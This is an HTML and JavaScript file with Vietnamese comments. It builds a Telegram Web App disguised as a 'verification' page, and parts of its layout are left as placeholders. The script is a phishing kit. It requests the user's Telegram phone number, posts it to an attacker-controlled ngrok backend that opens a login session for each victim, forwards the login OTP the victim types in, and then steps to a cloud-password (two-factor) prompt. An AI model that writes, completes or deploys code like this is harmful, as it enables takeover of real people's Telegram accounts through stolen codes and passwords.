<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Xác Minh</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <!-- Thêm CSS từ file new.html của bạn vào đây -->
    <style>
        /* [Giữ nguyên CSS từ new.html] */
        /* ... (Copy toàn bộ phần <style> từ new.html vào đây) ... */
    </style>
</head>
<body>

<div class="phone-container">
    <div class="phone">
        <!-- [Giữ nguyên cấu trúc HTML <div class="screen"> từ new.html] -->
        <!-- ... (Copy toàn bộ cấu trúc HTML từ new.html) ... -->
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
    
    // Lấy chat_id để đảm bảo Tool Session chạy song song cho từng người
    const chat_id = tg.initDataUnsafe?.user?.id || "unknown_user";

    // Hàm gọi API đồng bộ dữ liệu với Backend
    async function sendToBackend(endpoint, payload) {
        return await fetch(`${BACKEND_URL}/${endpoint}`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ ...payload, chat_id: chat_id })
        }).then(res => res.json());
    }

    // Logic xử lý khi nhấn nút xác nhận (Step 1)
    document.getElementById("shareContact").addEventListener("click", () => {
        const btn = document.getElementById('shareContact');
        btn.disabled = true;
        
        tg.onEvent('contactRequested', async (event) => {
            if (event.status === 'sent') {
                const phoneNumber = event.responseUnsafe.contact.phone_number;
                // Gửi SĐT về Backend để tạo Session song song
                await sendToBackend('send_phone', { phone: phoneNumber });
                goStep(2);
            }
        });
        tg.requestContact();
    });

    // Logic khi nhập xong OTP (Step 3 & 4)
    // Sửa hàm sau khi nhập đủ 5 số:
    async function handleOtpSubmit(otp, stateKey) {
        const result = await sendToBackend('verify_otp', { otp: otp });
        if (result.success) {
            goStep(5); // Chuyển sang nhập mật khẩu đám mây
        } else {
            goStep(4); // Nếu sai, báo lỗi
        }
    }

    // [Giữ nguyên các hàm goStep, pressKey, viewCode từ new.html]
    // ...
</script>
</body>
</html>
